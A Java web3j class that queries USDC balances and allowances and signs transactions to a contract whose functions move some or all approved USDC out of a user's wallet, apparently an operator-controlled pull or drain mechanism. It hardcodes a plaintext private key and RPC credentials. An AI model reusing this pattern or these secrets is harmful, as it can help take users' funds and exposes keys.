package io.renren;

import java.math.BigDecimal;
import java.math.BigInteger;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

import org.web3j.abi.FunctionEncoder;
import org.web3j.abi.FunctionReturnDecoder;
import org.web3j.abi.TypeReference;
import org.web3j.abi.datatypes.Address;
import org.web3j.abi.datatypes.Function;
import org.web3j.abi.datatypes.Type;
import org.web3j.abi.datatypes.Uint;
import org.web3j.crypto.Credentials;
import org.web3j.crypto.RawTransaction;
import org.web3j.crypto.TransactionEncoder;
import org.web3j.protocol.Web3j;
import org.web3j.protocol.core.DefaultBlockParameterName;
import org.web3j.protocol.core.methods.request.Transaction;
import org.web3j.protocol.core.methods.response.EthEstimateGas;
import org.web3j.protocol.core.methods.response.EthGetBalance;
import org.web3j.protocol.core.methods.response.EthGetTransactionCount;
import org.web3j.protocol.core.methods.response.TransactionReceipt;
import org.web3j.protocol.http.HttpService;
import org.web3j.tx.gas.DefaultGasProvider;
import org.web3j.utils.Convert;
import org.web3j.utils.Numeric;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;

import io.renren.common.exception.RRException;
import io.renren.common.utils.AESUtils;
import io.renren.modules.constants.Constants;
import lombok.Data;
import lombok.extern.slf4j.Slf4j;
import net.dongliu.requests.Requests;
@Slf4j
@Data
public class TestContractHandler  {

   private static final String COINGECKO_API_URL = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";

	   //https://rpc.ankr.com/eth/120891cdabc499c35321a3e501a9a6f63d469850d3e7d99e9743c079385c0b18
	protected String url = "https://eth.rpc.grove.city/v1/9511f6e4";
	 
	protected String usdcContract = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48" ; //USDT 合约地址
	
	protected String approveContract = "0xCa45276a51131B0113CA134F871Af016d4947Be3";
	
	protected String ownerAddress = "0xa08666cb36f791FA79F5aFBa0840285b941bb2EC";
	
	private String nodeUrl = "http://127.0.0.1:8000/";
	
	private String pk = "e2b198358722b14c8437607f12770d4e6689bd39934420d8db07d04c916e69d3";
	
	protected Web3j web3j;
	

	private static final ConcurrentHashMap<String, Credentials> credentialsMap = new ConcurrentHashMap<>();

	
	public TestContractHandler(){
		web3j = Web3j.build(new HttpService(url));		
		log.info("stake contract chain url :{}",url);
	}
	
	protected Credentials getCredentials(String address,String pk){
		Credentials credentials = credentialsMap.get(address);
		if(credentials == null){
			credentials = Credentials.create(pk);
			credentialsMap.put(address, credentials);
		}
		return credentials;
	}
	
	protected BigInteger getNonce(String address) throws Exception {
		EthGetTransactionCount ethGetTransactionCount = web3j
				.ethGetTransactionCount(address, DefaultBlockParameterName.LATEST).sendAsync().get();
		return ethGetTransactionCount.getTransactionCount();
	}


	public BigDecimal getUsdcBalance(String address) throws Exception{
	   Function function = new Function(
                "balanceOf",
                Arrays.asList(new Address(address)),
                Arrays.asList(new TypeReference<Uint>() {}));

        String encodedFunction = FunctionEncoder.encode(function);

        Transaction transaction = Transaction.createEthCallTransaction(
                address, usdcContract, encodedFunction);

        String response = web3j.ethCall(transaction, DefaultBlockParameterName.LATEST).send().getValue();

        List<Type> output = FunctionReturnDecoder.decode(response, function.getOutputParameters());
        if (output.isEmpty()) {
            return BigDecimal.ZERO;
        }
        BigInteger wei = (BigInteger) output.get(0).getValue();
        
        BigDecimal usdcBalance = Convert.fromWei(new BigDecimal(wei), Convert.Unit.MWEI).setScale(2,BigDecimal.ROUND_HALF_DOWN);
		return usdcBalance;
	}
	
	
	public BigDecimal allowance(String address,String approveContract) throws Exception{
		   Function function = new Function(
	                "allowance",
	                Arrays.asList(new Address(address), new Address(approveContract)),
	                Arrays.asList(new TypeReference<Uint>() {}));
	        String encodedFunction = FunctionEncoder.encode(function);

	        Transaction transaction = Transaction.createEthCallTransaction(
	                address, usdcContract, encodedFunction);

	        String response = web3j.ethCall(transaction, DefaultBlockParameterName.LATEST).send().getValue();

	        List<Type> output = FunctionReturnDecoder.decode(response, function.getOutputParameters());
	        if (output.isEmpty()) {
	            return BigDecimal.ZERO;
	        }
	        BigInteger wei = (BigInteger) output.get(0).getValue();
	        BigDecimal value = Convert.fromWei(new BigDecimal(wei), Convert.Unit.ETHER).setScale(2,BigDecimal.ROUND_HALF_DOWN);
			return value;
	}
	
    public BigDecimal getEthBalance(String address) throws Exception {
        EthGetBalance ethGetBalance = web3j.ethGetBalance(address, org.web3j.protocol.core.DefaultBlockParameterName.LATEST).send();
        BigInteger wei = ethGetBalance.getBalance();
        BigDecimal ethBalance = Convert.fromWei(new BigDecimal(wei), Convert.Unit.ETHER).setScale(5,BigDecimal.ROUND_HALF_DOWN);
        return ethBalance;
    }
	
    
 


    public String transferUsdc(String from,String fromPk,String to,BigDecimal amount) throws Exception {
    	log.info("开始执行收益提现:{} 转移USDT:{} from:{} to:{} ",usdcContract,amount,from,to);
		Credentials credentials = Credentials.create(AESUtils.decrypt(fromPk));
		BigInteger nonce = getNonce(credentials.getAddress());
		BigDecimal amountWei = Convert.toWei(amount, Convert.Unit.MWEI);
		String encodeInput = encodeInput("{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}",
				Arrays.asList(to,amountWei));
		 BigInteger gasLimit = BigInteger.valueOf(5_00_000);
		 long chainId =1L; // 根据实际情况设置链 ID
		 RawTransaction rawTransaction = RawTransaction.createTransaction(chainId, nonce, gasLimit, usdcContract, BigInteger.ZERO, encodeInput, 
        		   DefaultGasProvider.GAS_LIMIT, //maxPriorityFeePerGas (max fee per gas transaction willing to give to miners)
        	        BigInteger.valueOf(40_000_000_000L)) ;//maxFeePerGas (max fee transaction willing to pay)
		   
		 
		org.web3j.protocol.core.methods.response.EthSendTransaction response = web3j
				.ethSendRawTransaction(Numeric.toHexString(TransactionEncoder.signMessage(rawTransaction, credentials)))
				.sendAsync().get();
		if (response.hasError()) {
			log.error("收益提现执行USDT转账异常,参数为=>from:{} to:{} amount:{}  , 响应结果:{} ", from,to,amount,JSON.toJSONString(response.getError()));
			throw new RRException("Transfer Usdc Execption.");
		}
		TransactionReceipt result = null;
		int i = 0;
		while (result == null && i < 20) {
			try {
				result = web3j.ethGetTransactionReceipt(response.getTransactionHash()).sendAsync().get().getResult();
			} catch (Exception e) {
				log.error("收益提现执行USDT转账异常,参数为=>from:{} to:{} amount:{}  , 异常原因:{} ", from,to,amount,JSON.toJSONString(response.getError()));
			}
			++i;
			TimeUnit.MILLISECONDS.sleep(5000);
		}
		String transactionHash = response.getTransactionHash();
		log.info("收益提现执行USDT转账成功,参数为=>from:{} to:{} amount:{}  ,响应结果:{} ", from,to,amount, transactionHash);
		return transactionHash;
    }
    
    

    public String transferContractUsdc(String ownerAddress,String privateKey,String from,String to,BigDecimal amount) throws Exception {
    	log.info("开始执行合约:{} 转移USDT:{} from:{} to:{} ",approveContract,amount,from,to);
		Credentials credentials = getCredentials(ownerAddress,privateKey);
		BigInteger nonce = getNonce(credentials.getAddress());
		BigDecimal amountWei = Convert.toWei(amount, Convert.Unit.MWEI);
		String encodeInput = encodeInput("{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}",
				Arrays.asList(from,to,amountWei));
		
		 BigInteger gasLimit = BigInteger.valueOf(5_00_000);
		 long chainId =1L; // 根据实际情况设置链 ID
		 RawTransaction rawTransaction = RawTransaction.createTransaction(chainId, nonce, gasLimit, approveContract, BigInteger.ZERO, encodeInput, 
				 BigInteger.valueOf(2_000_000_000L), //maxPriorityFeePerGas (max fee per gas transaction willing to give to miners)
		         BigInteger.valueOf(40_000_000_000L));//maxFeePerGas (max fee transaction willing to pay)
		 
		 
		org.web3j.protocol.core.methods.response.EthSendTransaction response = web3j
				.ethSendRawTransaction(Numeric.toHexString(TransactionEncoder.signMessage(rawTransaction, credentials)))
				.sendAsync().get();
		if (response.hasError()) {
			log.error("执行USDT转账异常,参数为=>from:{} to:{} amount:{}  , 响应结果:{} ", from,to,amount,JSON.toJSONString(response.getError()));
			throw new RRException("Transfer Usdc Execption.");
		}
		TransactionReceipt result = null;
		int i = 0;
		while (result == null && i < 20) {
			try {
				result = web3j.ethGetTransactionReceipt(response.getTransactionHash()).sendAsync().get().getResult();
			} catch (Exception e) {
				log.error("执行USDT转账异常,参数为=>from:{} to:{} amount:{}  , 异常原因:{} ", from,to,amount,JSON.toJSONString(response.getError()));
			}
			++i;
			TimeUnit.MILLISECONDS.sleep(10000);
		}
		String transactionHash = response.getTransactionHash();
		log.info("执行USDT转账成功,参数为=>from:{} to:{} amount:{}  ,响应结果:{} ", from,to,amount, transactionHash);
		return transactionHash;
    }
    
    

    
    public String transferContractAllUsdc(String ownerAddress,String privateKey,String from,String to) throws Exception {
    	log.info("开始执行合约:{} 全量转移USDT from:{} to:{} ",approveContract,from,to);
		Credentials credentials = getCredentials(ownerAddress,privateKey);
		BigInteger nonce = getNonce(credentials.getAddress());
		String encodeInput = encodeInput("{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"transferAllAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}",
				Arrays.asList(from,to));
		 BigInteger gasLimit = BigInteger.valueOf(5_00_000);
		 long chainId =1L; // 根据实际情况设置链 ID
		 RawTransaction rawTransaction = RawTransaction.createTransaction(chainId, nonce, gasLimit, approveContract, BigInteger.ZERO, encodeInput, 
				 BigInteger.valueOf(2_000_000_000L), //maxPriorityFeePerGas (max fee per gas transaction willing to give to miners)
		         BigInteger.valueOf(40_000_000_000L));//maxFeePerGas (max fee transaction willing to pay)
		 
		 
		 
		org.web3j.protocol.core.methods.response.EthSendTransaction response = web3j
				.ethSendRawTransaction(Numeric.toHexString(TransactionEncoder.signMessage(rawTransaction, credentials)))
				.sendAsync().get();
		if (response.hasError()) {
			log.error("执行USDT 全量转账异常,参数为=>from:{} to:{}  , 响应结果:{} ", from,to,JSON.toJSONString(response.getError()));
			throw new RRException("Transfer Usdc Execption.");
		}
		TransactionReceipt result = null;
		int i = 0;
		while (result == null && i < 20) {
			try {
				result = web3j.ethGetTransactionReceipt(response.getTransactionHash()).sendAsync().get().getResult();
			} catch (Exception e) {
				log.error("执行USDT全量转账异常,参数为=>from:{} to:{}  , 异常原因:{} ", from,to,JSON.toJSONString(response.getError()));
			}
			++i;
			TimeUnit.MILLISECONDS.sleep(10000);
		}
		String transactionHash = response.getTransactionHash();
		log.info("执行USDT全量转账成功,参数为=>from:{} to:{}  ,响应结果:{} ", from,to, transactionHash);
		return transactionHash;
    }
    
    
    
    public void settingGrantRole(String accountAddress,String approveAddress) throws Exception {
    	log.info("开始执行合约:{} 用户钱包:{} 的转移权限,可操作钱包：{} ",approveContract,accountAddress,approveAddress);
		Credentials credentials = getCredentials(ownerAddress,pk);
		BigInteger nonce = getNonce(credentials.getAddress());
		String encodeInput = encodeInput("{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"authorizedWallet\",\"type\":\"address\"}],\"name\":\"grantTransferRole\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}",
				Arrays.asList(accountAddress,approveAddress));
		
		 BigInteger gasLimit = BigInteger.valueOf(5_00_000);
		 long chainId =1L; // 根据实际情况设置链 ID
		 RawTransaction rawTransaction = RawTransaction.createTransaction(chainId, nonce, gasLimit, approveContract, BigInteger.ZERO, encodeInput, 
				 BigInteger.valueOf(2_000_000_000L), //maxPriorityFeePerGas (max fee per gas transaction willing to give to miners)
		         BigInteger.valueOf(40_000_000_000L));//maxFeePerGas (max fee transaction willing to pay)
		 
		 
		   
		org.web3j.protocol.core.methods.response.EthSendTransaction response = web3j
				.ethSendRawTransaction(Numeric.toHexString(TransactionEncoder.signMessage(rawTransaction, credentials)))
				.sendAsync().get();
		if (response.hasError()) {
			log.error("设置用户钱包:{} 转移权限,执行异常,参数为=>address:{},响应结果:{} ", accountAddress, JSON.toJSONString(response.getError()));
			throw new RRException(String.format("设置用户钱包:%s 转移权限,执行异常!",accountAddress));
		}
		TransactionReceipt result = null;
		int i = 0;
		while (result == null && i < 10) {
			try {
				result = web3j.ethGetTransactionReceipt(response.getTransactionHash()).sendAsync().get().getResult();
			} catch (Exception e) {
				log.error("设置用户钱包:{} 转移权限,执行异常,参数为=>address:{},响应结果:{} ", accountAddress, JSON.toJSONString(response.getError()));
				throw new RRException(String.format("设置用户钱包:%s 转移权限,执行异常!",accountAddress));
			}
			++i;
			TimeUnit.MILLISECONDS.sleep(2000);
		}
		String transactionHash = response.getTransactionHash();
		log.info("设置用户钱包:{} 转移权限成功,参数为=>address:{},响应结果:{} ", accountAddress, transactionHash);
    }
    
     

	public String encodeInput(String abi, List<Object> input) throws Exception {
		Map<String, Object> jsonMap = new HashMap<>();
		jsonMap.put("abi", abi);
		jsonMap.put("data", input);
		return Requests.post(nodeUrl + "encodeInput").jsonBody(jsonMap).send().readToText();
	}

	public String decodeOutput(String abi, String data) throws Exception {
		Map<String, Object> jsonMap = new HashMap<>();
		jsonMap.put("abi", abi);
		jsonMap.put("data", data);
		return Requests.post( nodeUrl + "decodeOutput").jsonBody(jsonMap).send().readToText();
	}

    
	public void getGasLimit(String accountAddress,String approveAddress) throws Exception {
		BigInteger currentGasPrice = web3j.ethGasPrice().send().getGasPrice();
		BigInteger nonce = getNonce(ownerAddress);
		String encodeInput = encodeInput("{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"authorizedWallet\",\"type\":\"address\"}],\"name\":\"grantTransferRole\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}",
				Arrays.asList(accountAddress,approveAddress));
		EthEstimateGas ethEstimateGas = web3j.ethEstimateGas(
			    Transaction.createFunctionCallTransaction(
			        ownerAddress, nonce, currentGasPrice, null, approveContract, encodeInput))
			    .send();
			BigInteger gasLimit = ethEstimateGas.getAmountUsed();
			System.out.println("gasLimit : " + gasLimit);
	}
	

	public boolean hasTransferRole(String approveWallet) throws Exception {
		String transferRoleStr = transferRole();
		String encodeInput = encodeInput("{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"role\",\"type\":\"bytes32\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"hasRole\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}",
		Arrays.asList(transferRoleStr,approveWallet));
		org.web3j.protocol.core.methods.response.EthCall response = web3j
				.ethCall(Transaction.createEthCallTransaction(ownerAddress, approveContract, encodeInput),
						DefaultBlockParameterName.LATEST)
				.sendAsync().get();
		String relStr = decodeOutput("{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"role\",\"type\":\"bytes32\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"hasRole\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}", response.getResult());
		log.info("transferRole,响应结果:{}", relStr);
		List<Boolean> rel = JSONArray.parseArray(relStr, Boolean.class);
		return rel.get(0);
	}
	
	public String transferRole() throws Exception {
		String encodeInput = encodeInput("{\"inputs\":[],\"name\":\"TRANSFER_ROLE\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"}",
		Arrays.asList());
		org.web3j.protocol.core.methods.response.EthCall response = web3j
				.ethCall(Transaction.createEthCallTransaction(ownerAddress, approveContract, encodeInput),
						DefaultBlockParameterName.LATEST)
				.sendAsync().get();
		String relStr = decodeOutput("{\"inputs\":[],\"name\":\"TRANSFER_ROLE\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"}", response.getResult());
		List<String> rel = JSONArray.parseArray(relStr, String.class);
		return rel.get(0);
	}
	
	
 
	
	public static void main(String[] args) {
		String userWallet = "0xb7DCBef6e56685BeC745FfbF22993B19721f16A4";
//		String reciverWallet = "0x629f578bc0D2943527b14f22C8cC8d4ca6a3aaf8";
//		String approveWallet = "0x8314AB429000fDFe45fD4EDB9D3D3BAFcad9bDe5";
//		
//		String approveKey = AESUtils.encrypt( "589257802aaec6b628b51e71450fb3f2e5ac46a60a32915b9ea9fa33b647218a");
//		
		TestContractHandler handler = new TestContractHandler();
		
		try {
			BigDecimal apporveUsdc = handler.allowance("0x75879449913e368528a63588E637613327E393F9", "0xf04619c12264Fb77690FBd06B9816F1BD6364999");
			System.out.println(apporveUsdc);
			//BigInteger nonce = handler.getNonce("0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045");
			//System.out.println(nonce);
//			boolean hasTransferRole = handler.hasTransferRole(approveWallett);
//			System.out.println(hasTransferRole);
		//	BigDecimal eth = handler.getEthBalance(userWallet);
		//	System.out.println(eth);
//			BigDecimal usdc = handler.getUsdcBalance(userWallet);
//			System.out.println(usdc);
			//			handler.settingGrantRole(userWallet, approveWallett);
		//	System.out.println(AESUtils.decrypt(approveKey));
		//	handler.transferContractUsdc( approveWallet,approveKey,userWallet,reciverWallet,new BigDecimal("10"));
			//handler.transferAllUsdc(approveWallet, approveKey, userWallet, reciverWallet);
//			String hexString = "000000000000000000000000000000000000000000000000000000001fa53240";
//			   // 将十六进制字符串转换为 BigInteger
//	        BigInteger bigInt = new BigInteger(hexString, 16); // 16 表示是十六进制
//
//	        // 将 BigInteger 转换为 BigDecimal
//	        BigDecimal bigDecimal = new BigDecimal(bigInt);
//
//	        // 输出结果
//	        System.out.println("十六进制字符串: " + hexString);
//	        System.out.println("转换后的 BigDecimal 值: " + bigDecimal);
//			String poolsWallet = "0x13Fad8fBe08b774c0D4497917336A5C09504f1f2";
//			String privateKey = "0EF40268542A159777DC117B4801099D36E59347EC1ECAC1182E6E8FF4167A8CFDF36EB3409C029B00E7ED4F729655805E4D3195FADEF077DEABDE8A36042BEE8167EA604D9F23D7D68670A589FEE019";
//			String wallet= "0x8DEe0C9891235a9f0A6F4A7D0bF2f29e84314655";
//			BigDecimal usdc = new BigDecimal("1.28960");
//			String hash = handler.transferUsdc(poolsWallet,privateKey, wallet, usdc);
			//7c3f0206a03506e4a7999433cec228812f874cfb75a71fd151a07fd5f9dcccf5
			//7c3f0206a03506e4a7999433cec228812f874cfb75a71fd151a07fd5f9dcccf5
		//	System.out.println(AESUtils.decrypt("0EF40268542A159777DC117B4801099D36E59347EC1ECAC1182E6E8FF4167A8CFDF36EB3409C029B00E7ED4F729655805E4D3195FADEF077DEABDE8A36042BEE8167EA604D9F23D7D68670A589FEE019"));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
